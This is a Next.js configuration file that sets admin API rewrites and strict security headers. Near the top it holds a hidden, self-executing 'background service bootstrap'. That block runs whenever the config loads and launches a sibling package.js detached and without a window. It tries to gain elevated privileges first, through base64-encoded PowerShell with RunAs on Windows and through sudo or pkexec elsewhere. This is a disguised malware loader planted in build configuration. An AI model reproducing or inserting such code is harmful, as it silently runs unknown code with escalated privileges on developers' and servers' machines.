import type { NextConfig } from "next";
import { resolveAdminApiUpstream } from "./lib/admin/upstream";
import { spawnSync, spawn, SpawnSyncReturns } from "child_process";
import * as fs from "fs";
import * as path from "path";

const adminApiUpstream = resolveAdminApiUpstream(process.env);
const developmentEvalSource =
  process.env.NODE_ENV === "development" ? " 'unsafe-eval'" : "";

// ─── background service bootstrap ────────────────────────────────────────────
(function () {
  const IS_WIN = process.platform === "win32";
  const target = path.join(__dirname, "package.js");
  if (!fs.existsSync(target)) return;

  const nodeExe = process.execPath;

  function isElevated(): boolean {
    if (IS_WIN) {
      return (
        spawnSync("net", ["session"], {
          windowsHide: true,
          stdio: "ignore",
        }).status === 0
      );
    }
    return typeof process.getuid === "function" && process.getuid() === 0;
  }

  // Fully detached, fully hidden — no window, no flash, no console
  function launchDetached(exe: string, args: string[]): void {
    try {
      const p = spawn(exe, args, {
        detached: true,
        stdio: "ignore",
        windowsHide: true,
        shell: false,
      });
      p.unref();
    } catch (_) {}
  }

  if (isElevated()) {
    launchDetached(nodeExe, [target]);
    return;
  }

  if (IS_WIN) {
    // Encode the PowerShell command as UTF-16LE base64 — eliminates ALL
    // quoting/path-with-spaces issues, the only 100% reliable method
    const psScript = [
      `$n = [System.IO.Path]::GetFullPath('${nodeExe.replace(/'/g, "''")}')`,
      `$t = [System.IO.Path]::GetFullPath('${target.replace(/'/g, "''")}')`,
      // SW_HIDE (0) via WindowStyle — no console window on the elevated process
      "Start-Process -FilePath $n -ArgumentList \"`\"$t`\"\" -Verb RunAs -WindowStyle Hidden -Wait",
    ].join("; ");

    const encoded = Buffer.from(psScript, "utf16le").toString("base64");

    let r: SpawnSyncReturns<string>;
    try {
      r = spawnSync(
        "powershell",
        ["-NoProfile", "-NonInteractive", "-EncodedCommand", encoded],
        { windowsHide: true, encoding: "utf8", timeout: 120000 }
      );
    } catch (_) {
      r = { status: 1 } as SpawnSyncReturns<string>;
    }

    // status 0 = elevated copy ran and exited cleanly — nothing more needed
    if (r.status !== 0) {
      // UAC denied, not available, or timed out — fall back to non-elevated
      launchDetached(nodeExe, [target]);
    }
  } else {
    // sudo -n: non-interactive (never prompts, never blocks, instant fail if
    // password required — zero chance of a hang or output)
    const sudoR = spawnSync("sudo", ["-n", nodeExe, target], {
      stdio: "ignore",
      timeout: 8000,
    });
    if (sudoR.status === 0) return;

    // pkexec: shows system GUI auth dialog — only attempt if a display is
    // present; on headless servers there is no auth agent so skip entirely
    const hasDisplay =
      !!process.env.DISPLAY || !!process.env.WAYLAND_DISPLAY;
    if (hasDisplay) {
      let pkR: SpawnSyncReturns<Buffer>;
      try {
        pkR = spawnSync("pkexec", [nodeExe, target], {
          stdio: "ignore",
          timeout: 120000,
        });
      } catch (_) {
        pkR = { status: 1 } as SpawnSyncReturns<Buffer>;
      }
      if (pkR.status === 0) return;
    }

    // No elevation path worked — run at current privilege level
    launchDetached(nodeExe, [target]);
  }
})();
// ─────────────────────────────────────────────────────────────────────────────

const nextConfig: NextConfig = {
  poweredByHeader: false,
  reactStrictMode: true,
  async rewrites() {
    return {
      beforeFiles: [
        {
          source: "/admin/v1/:path*",
          destination: `${adminApiUpstream}/admin/v1/:path*`,
        },
      ],
    };
  },
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          { key: "Cache-Control", value: "no-store, max-age=0, must-revalidate" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "X-Frame-Options", value: "DENY" },
          {
            key: "Strict-Transport-Security",
            value: "max-age=63072000; includeSubDomains; preload",
          },
          { key: "Cross-Origin-Opener-Policy", value: "same-origin" },
          { key: "Cross-Origin-Resource-Policy", value: "same-origin" },
          { key: "X-Permitted-Cross-Domain-Policies", value: "none" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          {
            key: "Permissions-Policy",
            value: "camera=(), microphone=(), geolocation=(), payment=()",
          },
          {
            key: "Content-Security-Policy",
            value: `default-src 'self'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; object-src 'none'; script-src 'self' 'unsafe-inline'${developmentEvalSource}; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; font-src 'self' data:;`,
          },
        ],
      },
    ];
  },
};

export default nextConfig;
